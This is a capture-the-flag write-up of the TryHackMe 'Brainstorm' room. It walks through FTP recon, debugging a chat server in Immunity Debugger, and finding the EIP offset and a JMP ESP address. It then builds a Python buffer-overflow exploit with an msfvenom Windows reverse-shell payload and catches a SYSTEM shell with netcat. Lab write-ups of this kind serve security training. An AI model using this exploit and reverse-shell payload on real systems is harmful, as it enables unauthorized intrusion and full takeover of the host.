---
title: "Walk-through of Brainstorm from TryHackMe"
header:
  teaser: /assets/images/2021-02-21-11-28-18.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - Buffer Overflow
  - Reverse Engineering
  - 
---

## Machine Information

![brainstorm](/assets/images/2021-02-21-11-28-18.png)

Brainstorm is rated as a medium difficulty room on TryHackMe. This Windows based server has a few open ports but something called Brainstorm Chat on port 9999 immediately gets our attention. We also find an anonymous FTP server that let's us grab the binaries for the chatserver. From there we reverse engineer the application to work out how we can exploit a buffer overflow vulnerability. We then write a custom python script to gain a reverse shell on to the server.
<!--more-->

Skill required are a basic understanding of the tools and techniques needed to debug an application. Skills learned are a better understanding of EIP, ESP and other registers that we can use to help us develop an exploit. We also learn a little about Immunity Debugger for Windows.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Brainstorm](https://tryhackme.com/room/brainstorm) |
| Machine Release Date | 7th September 2019 |
| Date I Completed It | 21st February 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
root@kali:/home/kali/thm/skynet# ports=$(nmap -p- --min-rate=1000 -T4 10.10.2.82 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:/home/kali/thm/skynet# nmap -p$ports -sC -sV -oA brainstorm 10.10.2.82
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 21:13 GMT
Error #486: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
```

Wait, what's this error? This is the reminder to always read the room information in case of helpful hints, for this one it says:

```text
Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
```

Try again this time with -Pn to disable host discovery:

```text
root@kali:/home/kali/thm/brainstorm# nmap -Pn -sC -sV -oA brainstorm 10.10.2.82
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 21:14 GMT
Nmap scan report for 10.10.2.82
Host is up (0.036s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST:Windows_NT
3389/tcp open tcpwrapped
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2021-02-17T21:07:32
|_Not valid after: 2021-08-19T21:07:32
|_ssl-date: 2021-02-18T21:17:39+00:00; +2s from scanner time. 
9999/tcp open abyss?
|fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL:
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.80 seconds
```

This gives us the information needed to complete Task 1.

## Task 2

We find a few useful things from our scan. First we are dealing with a Windows server, which changes our approach to some areas. Secondly we have a few open ports, something called Brainstorm chat on port 9999, but most notably is anonymous FTP on port 21. Let's start with that one and see if we can find anything:

```text
root@kali:/home/kali/thm/brainstorm# ftp 10.10.2.82
Connected to 10.10.2.82.
220 Microsoft FTP Service
Name (10.10.2.82:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  07:36PM       <DIR>          chatserver
226 Transfer complete.
```

We are logged in as the anonymous user, and we see a directory called chatserver. Lets have a look in there:

```text
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  09:26PM                43747 chatserver.exe
08-29-19  09:27PM                30761 essfunc.dll
226 Transfer complete.
```

You now have the information needed to answer Task 2.

## Task 3

We find a couple of files, let's copy them to our local Kali so we can look at them:

```text
ftp> mget
(remote-files) *
mget chatserver.exe? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 45 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
43747 bytes received in 0.24 secs (180.2709 kB/s)
mget essfunc.dll? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 32 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
30761 bytes received in 0.11 secs (281.6324 kB/s)
```

If you see the above then you've tried to download a binary as text. Change the transfer mode then try again:

```text
ftp> bin
200 Type set to I.
ftp> mget
(remote-files) *
mget chatserver.exe? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
43747 bytes received in 0.14 secs (300.5796 kB/s)
mget essfunc.dll? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
30761 bytes received in 0.11 secs (282.2967 kB/s)
ftp> quit
221 Goodbye.
```

It's safe to assume that the chat server running on port 9999 on the brainstorm server is using the same files as those we've just downloaded. Let's have a quick look at the server version now to see what we can find:

```text
root@kali:/home/kali/thm/brainstorm# nc -nv 10.10.2.82 9999
(UNKNOWN) [10.10.2.82] 9999 (?) open
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): pencer.io
Write a message: Hello!
Thu Feb 18 14:25:44 2021
pencer.io said: Hello!

Write a message:  help
Thu Feb 18 14:25:54 2021
pencer.io said: help

Write a message:  I guess you don't do anything?
Thu Feb 18 14:26:06 2021
pencer.io said: I guess you don't do anything?

Write a message:  ^C
```

So it appears to be a simple program, we can now assume the files we've downloaded are vulnerable in some way for us to exploit. We have a Windows 32bit binary and supporting dll, so to further debug we'll need to transfer them to a Windows VM where we can use Immunity Debugger to analyse them.

Start a web server on Kali so we can get to the files we've downloaded:

```text
root@kali:/home/kali/thm/brainstorm# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

To keep it simple I'll use a Windows 7 32bit VM. Once booted browse to my Kali webserver to get the files:

![brainstorm-kaliweb](/assets/images/2021-02-18-22-32-15.png)

Run the chatserver on my Win7 machine, and check I can connect the same as the one running on the brainstorm server:

![brainstorm-chatserver.exe](/assets/images/2021-02-18-22-33-30.png)

Now try and connect as before from Kali:

```text
root@kali:/home/kali/thm/brainstorm# nc -nv 192.168.0.16 9999
(UNKNOWN) [192.168.0.16] 9999 (?) open
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): pencer.io
Write a message: Are you the same?
Thu Feb 18 22:35:18 2021
pencer.io said: Are you the same?
```

We have now confirmed the files downloaded are the same as those running on the server. It's time to start looking at how we create a buffer overflow that we control, which will allow us to gain access to the server.

If you want to learn more about buffer overflows and how they work, then [this](https://tryhackme.com/room/bof1) tryhackme room is a good starter. Also [here](https://github.com/gh0x0st/Buffer_Overflow) is a good walkthrough on how to build up your python script. I'll be using the basics from this in the follow sections.

First install 32bit MSI installer for Python 2.7.18 from [here](https://www.python.org/downloads/release/python-2718/) on the VM you are running the chatserver from.

Then install Immunity Debugger from [here](https://www.immunityinc.com/products/debugger/), you'll need to register to get it although there is no check on the email address you use.

Finally get the Mona python script from [here](https://github.com/corelan/mona). We can use this in Immunity to speed up the process of developing our exploit. You'll need to copy the mona.py file in to the PyCommands folder in the Immunity install before you can use it.

Now we are set up for debugging. First make sure your chatserver is still running, then start Immunity and from the File menu chose Attach, then find the chatserver process in the list:

![brainstorm-immunityattach](/assets/images/2021-02-18-22-44-29.png)

Note in the bottom right corner it says Paused. You need to press F9 to run:

![brainstorm-immunitypaused](/assets/images/2021-02-18-23-00-24.png)

It's safe to assume we will be trying to use a buffer overflow to exploit the program, so let's connect from Kali to it again and try sending increasing numbers of characters until we crash it:

```text
root@kali:/home/kali/thm/brainstorm# python -c 'print "A" * 1000'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<SNIP>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Try sending 1000 characters:

```text
root@kali:/home/kali/thm/brainstorm# nc -nv 192.168.0.16 9999
(UNKNOWN) [192.168.0.16] 9999 (?) open
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<SNIP>
AAAAAAAAAAAA
Write a message: 
```

No crash on the username field, try sending 1000 to the message field:

```text
Write a message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<SNIP>
AAAAAAAAAAAAAAAAAAAAAAAA
Thu Feb 18 22:52:01 2021
AAAAAAAAAAAAAAAAAAAA said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<SNIP>
AAAAAAAAAAAAAAAAAAAAAAAA
Write a message:  ^C
```

No crash on message field with 1000 characters either. We repeat this in 500 char increments until we get to 2500 character, and then we see we have crashed the program and overwritten the buffer:

```text
root@kali:/home/kali/thm/brainstorm# python -c 'print "A" * 2500'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<SNIP>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

root@kali:/home/kali/thm/brainstorm# nc -nv 192.168.0.16 9999
(UNKNOWN) [192.168.0.16] 9999 (?) open
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<SNIP>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Write a message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<SNIP>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Switching back to our Win7 VM we see Immunity has caught the exception:

![brainstorm-accessviolation](/assets/images/2021-02-18-23-07-36.png)

And looking at the registers we can see EIP has been overwritten with 41414141, which is our AAAA from the large string we passed in:

![brainstorm-registers](/assets/images/2021-02-18-23-07-02.png)

Now we have confirmed that we can cause a buffer overflow we need to find the exact number of characters to send so we can take control of EIP. We can use the Meterpreter script to generate a unique string for this:

```text
root@kali:/home/kali/thm/brainstorm# msf-pattern_create -l 2500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A
<SNIP>
c8Ac9Ad9A0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5
```

You could also use Mona to do this by typing in the command bar at the bottom on Immunity:

```text
!mona pattern_create 2500
```

Send this to the message field as before, and when the program crashes check EIP in Immunity again:

![brainstorm-eip](/assets/images/2021-02-18-23-16-14.png)

This time we see the value in EIP is 31704330, now we use the msf pattern offset script to find what character length we need:

```text
root@kali:/home/kali/thm/brainstorm# msf-pattern_offset -l 2500 -q 31704330
[*] Exact match at offset 2012
```

If you used Mona to create your pattern then use it again to find the offset:

```text
!mona pattern_offset 31704330
```

Now we need to start building our python script that we'll use to exploit the application. I use the skeleton one from [here](https://github.com/gh0x0st/Buffer_Overflow) as a starter:

![brainstorm-script](/assets/images/2021-02-20-11-23-35.png)

I add my Win7 VM IP that is running the chatserver application. I also need a user and message to send the app. We've already worked out that 2012 characters will cause the app to crash. Let's just test our script works before we move on.

This is how my basic script looks now:

```text
#!/usr/bin/python 

import socket,sys

address = '192.168.0.16'
port = 9999
user = 'pencer.io'
message = 'A' * 2012

try:
        print '[+] Sending buffer'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address,port))
        s.recv(1024)
        s.recv(1024)
        s.send(user + '\r\n')
        s.recv(1024)
        s.send(message + '\r\n')
except:
        print '[!] Unable to connect to the application.'
        sys.exit(0)
finally:
        s.close()
```

On my Kali machine I run the script:

```text
root@kali:/home/kali/thm/brainstorm# python buffer.py 
[+] Sending buffer
```

Now switch to Win7 and we see our script connected and sent the username pencer.io

![brainstorm-connected](/assets/images/2021-02-20-11-27-41.png)

Then it sent 2012 characters, which caused the application to crash:

![brainstorm-crash](/assets/images/2021-02-20-11-29-56.png)

Excellent. We know have a working script to crash the application, the next step is to place our own code on the EIP which will let us run malicious shellcode.

## Control EIP

We can confirm we are able to overwrite the EIP by adding four B characters to the end of our 2012 A's. Add the second line here to our script to put those B's in:

```text
message = 'A' * 2012
message += 'B' * 4
```

Now run it again against the chatserver and check Immunity to see we have overwritten:

![brainstorm-eipoverwrite](/assets/images/2021-02-20-11-40-00.png)

We see 42424242, which is ASCII for our four B's.

Things are looking good. Our next job is to check for bad characters, as sending any will cause the overflow to stop before it completes executing our payload. When we use MSFVenom to generate our shellcode we can exclude any characters that would stop it from executing.

There's lot's of sites that list these, I'll use [this](tps://github.com/cytopia/badchars) and add them to our script. So our message now looks like this:

```text
message = 'A' * 3000
message += 'B' * 4
message += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\"
<SNIP>
```

Now we run it again against the chatserver, then we look in Immunity to find them in the register:

![brainstorm-registersagain](/assets/images/2021-02-20-16-30-35.png)

Here we see our A's (41), then B's (42), and then our bad characters in reverse. We are looking through the list to see if any are missing. If they are then we know we can't use those characters in our payload. Having checked through the list we find that they are all there.

The final step is to find the location of ESP, we need this because we use it to point to our payload. A simple way is to use [mona](https://github.com/corelan/mona) which has a command to find it:

```text
!mona jmp -r esp
```

Running that in Immunity we see 9 results:

![brainstorm-esp](/assets/images/2021-02-20-16-58-40.png)

Let's take the first one, which is 0x625014DF. We'll need to change that to the correct [Little Endian](https://en.wikipedia.org/wiki/Endianness) format in our script, which we'll get to soon. First we need our payload, for this we use MSFVenom:

```text
root@kali:/home/kali/thm/brainstorm# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.20 LPORT=1234 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xba\x40\xfd\xb6\x4c\xd9\xe9\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x10\xf3\x54"
buf += b"\xb9\x6c\xe3\x1b\x42\x8c\xf4\x7b\xca\x69\xc5\xbb\xa8"
<SNIP>
```

Those parameters explained:

```text
-p windows/shell_reverse_tcp = Payload is a Windows reverse shell
LHOST=192.168.0.20           = IP to connect back to is my Kali machine
LPORT=1234                   = Port to connect to on Kali
-f py                        = Output payload in python for our script
-e x86/shikata_ga_nai        = Which encoder to use
-b "\x00"                    = Bad characters to avoid
```

We now have all the information we need to complete our script:

```text
address = '192.168.0.11'
port = 9999
user = 'pencer.io'
buf =  b""
buf += b"\xba\x40\xfd\xb6\x4c\xd9\xe9\xd9\x74\x24\xf4\x58\x31"
<SNIP>
buf += b"\x43\x68\x9f\xb2\x0e\x8b\x4a\xf0\x36\x08\x7e\x89\xcc"
buf += b"\x10\x0b\x8c\x89\x96\xe0\xfc\x82\x72\x06\x52\xa2\x56"
esp = '\xdf\x14\x50\x62'
nop = '\x90'*20

message = 'A' * 2012 
message += esp
message += nop
message += buf
```

Those parameters explained:

```text
'A' * 2012 - The number of A's needed to crash the application
ESP        - The value of the ESP that will instruct the application to execute our code
NOP        - Our code may get cut off, adding a NOP sled ensures it works
BUF        - This is our shellcode from MSFVenom
```

Now we just have to start netcat listening on Kali. Ensure the chatserver is running on our Win7 VM, then run our script:

```text
root@kali:/home/kali/thm/brainstorm# nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [192.168.0.11] 63138
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\administrator\Desktop>
```

## Gaining Access

We have our reverse shell working against our local copy of the application. To complete the room we just need to run it against the server version now. To do this we need the IP of the server, which we then put in our script to change it from the IP of our Win7 VM. We also need to run MSFVenom again and give it the IP of our VPN adapter on Kali instead of the one on the local network. Then we just start netcat listening again and run our script:

```text
root@kali:/home/kali/thm/brainstorm# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.14.6.200] from (UNKNOWN) [10.10.20.47] 49166
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We now have a connection to the server. Let's get the root flag and we are done:

```text
C:\Windows\system32>cd ..\..
C:\>cd users
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users

08/29/2019  09:20 PM    <DIR>          .
08/29/2019  09:20 PM    <DIR>          ..
08/29/2019  09:21 PM    <DIR>          drake
11/20/2010  11:16 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  19,652,292,608 bytes free

C:\Users>cd drake
C:\Users\drake>cd desktop
C:\Users\drake\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake\Desktop

08/29/2019  09:55 PM    <DIR>          .
08/29/2019  09:55 PM    <DIR>          ..
08/29/2019  09:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,652,292,608 bytes free

C:\Users\drake\Desktop>type root.txt
type root.txt
<HIDDEN>
```

This room was a bit more involved than others. Hopefully I've explained the process in enough detail to help you understand it.

See you next time.
